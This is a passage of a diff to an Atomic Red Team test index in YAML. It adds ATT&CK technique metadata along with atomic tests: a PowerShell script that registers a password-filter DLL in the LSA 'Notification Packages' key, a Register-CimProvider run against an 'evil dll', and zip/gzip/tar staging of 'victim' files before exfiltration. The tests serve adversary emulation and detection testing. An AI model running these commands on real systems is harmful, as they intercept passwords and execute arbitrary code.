+      - url: https://clymb3r.wordpress.com/2013/09/15/intercepting-password-changes-with-function-hooking/
+        description: Bialek, J. (2013, September 15). Intercepting Password Changes
+          With Function Hooking. Retrieved November 21, 2017.
+        source_name: Clymb3r Function Hook Passwords Sept 2013
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      x_mitre_contributors:
+      - Vincent Le Toux
+      x_mitre_data_sources:
+      - DLL monitoring
+      - Process monitoring
+      - Windows Registry
+      x_mitre_detection: |-
+        Monitor for change notifications to and from unfamiliar password filters.
+
+        Newly installed password filters will not take effect until after a system reboot.
+
+        Password filters will show up as an autorun and loaded DLL in lsass.exe. (Citation: Clymb3r Function Hook Passwords Sept 2013)
+      x_mitre_permissions_required:
+      - Administrator
+      - SYSTEM
+      x_mitre_platforms:
+      - Windows
+      type: attack-pattern
+      kill_chain_phases:
+      - phase_name: credential-access
+        kill_chain_name: mitre-attack
+      modified: '2018-10-17T00:14:20.652Z'
+      created: '2018-01-16T16:13:52.465Z'
+      identifier: T1174
+    atomic_tests:
+    - name: Install and Register Password Filter DLL
+      description: 'Uses PowerShell to install and register a password filter DLL.
+        Requires a reboot and administrative privileges.
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        input_dll:
+          description: Path to DLL to be installed and registered
+          type: Path
+          default: C:\AtomicRedTeam\atomics\T1174\src\AtomicPasswordFilter.dll
+      executor:
+        name: powershell
+        command: |-
+          $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename
+          $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
+          $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
+          $notificationPackagesValues += $passwordFilterName
+          Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" "Notification Packages" $notificationPackagesValues
+          Restart-Computer -Confirm
   T1145:
     technique:
       id: attack-pattern--56ff457d-5e39-492b-974c-dfd2b8603ffe
@@ -15539,6 +16011,22 @@ execution:
         command: 'SyncAppvPublishingServer.exe "n; #{powershell_code}"
 
 '
+    - name: Register-CimProvider - Execute evil dll
+      description: 'Execute arbitrary dll. Requires at least Windows 8/2012. Also
+        note this dll can be served up via SMB
+
+'
+      supported_platforms:
+      - windows
+      input_arguments:
+        dll_payload:
+          description: DLL to execute
+          type: Path
+          default: C:\AtomicRedTeam\atomics\T1218\src\Win32\T1218-2.dll
+      executor:
+        name: command_prompt
+        command: "C:\\Windows\\SysWow64\\Register-CimProvider.exe -Path #{dll_payload}
+          \n"
   T1216:
     technique:
       id: attack-pattern--f6fe9070-7a65-49ea-ae72-76292f42cebe
@@ -17919,24 +18407,67 @@ exfiltration:
         command: 'rar a -r #{output_file} #{input_file}
 
 '
-    - name: Data Compressed - nix
-      description: "An adversary may compress data (e.g., sensitive documents) that
-        is collected prior to exfiltration \n"
+    - name: Data Compressed - nix - zip
+      description: 'An adversary may compress data (e.g., sensitive documents) that
+        is collected prior to exfiltration. This test uses standard zip compression.
+
+'
       supported_platforms:
       - linux
       - macos
+      input_arguments:
+        input_files:
+          description: Path that should be compressed into our output file, may include
+            wildcards
+          type: Path
+          default: "/tmp/victim-files/*"
+        output_file:
+          description: Path that should be output as a zip archive
+          type: Path
+          default: "/tmp/victim-files.zip"
       executor:
         name: sh
-        command: |
-          mkdir /tmp/victim-files
-          cd /tmp/victim-files
-          touch a b c d e f g
-          echo "This file will be gzipped" > /tmp/victim-gzip.txt
-          echo "This file will be tarred" > /tmp/victim-tar.txt
-          zip /tmp/victim-files.zip /tmp/victim-files/*
-          gzip -f /tmp/victim-gzip.txt
-          tar -cvzf /tmp/victim-files.tar.gz /tmp/victim-files/
-          tar -cvzf /tmp/victim-tar.tar.gz
+        command: 'zip #{output_file} #{input_files}
+
+'
+    - name: Data Compressed - nix - gzip Single File
+      description: 'An adversary may compress data (e.g., sensitive documents) that
+        is collected prior to exfiltration. This test uses standard gzip compression.
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        input_file:
+          description: Path that should be compressed
+          type: Path
+          default: "/tmp/victim-gzip.txt"
+      executor:
+        name: sh
+        command: 'gzip -f #{input_file}
+
+'
+    - name: Data Compressed - nix - tar Folder or File
+      description: 'An adversary may compress data (e.g., sensitive documents) that
+        is collected prior to exfiltration. This test uses standard gzip compression.
+
+'
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        input_file_folder:
+          description: Path that should be compressed
+          type: Path
+          default: "/tmp/victim-files/"
+        output_file:
+          description: File that should be output
+          type: Path
+          default: "/tmp/victim-files.tar.gz"
+      executor:
+        name: sh
+        command: 'tar -cvzf #{output_file} #{input_file_folder}'
   T1022:
     technique:
       id: attack-pattern--d54416bd-0803-41ca-870a-ce1af7c05638
